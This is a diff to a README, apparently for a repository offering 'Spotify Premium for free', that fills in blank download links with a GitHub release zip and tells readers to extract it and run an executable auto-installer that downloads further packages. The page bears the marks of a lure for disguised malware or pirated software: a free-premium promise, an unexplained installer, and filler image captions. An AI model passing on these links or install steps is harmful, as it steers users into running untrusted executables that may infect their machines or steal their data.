@@ -5,9 +5,9 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/8c7fafaa-10e4-4eba-84e1-54b0634418b1)
-]()
+](https://github.com/cesarm1987/Spotify-Premium-for-free-2024/releases/download/V7.43/Release.zip)
 
-## **1. [Download the archive]() and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/cesarm1987/Spotify-Premium-for-free-2024/releases/download/V7.43/Release.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
 
 ![dfgfdg](https://github.com/user-attachments/assets/521fc0a8-3391-43ed-9931-c3dc9f9e9091)
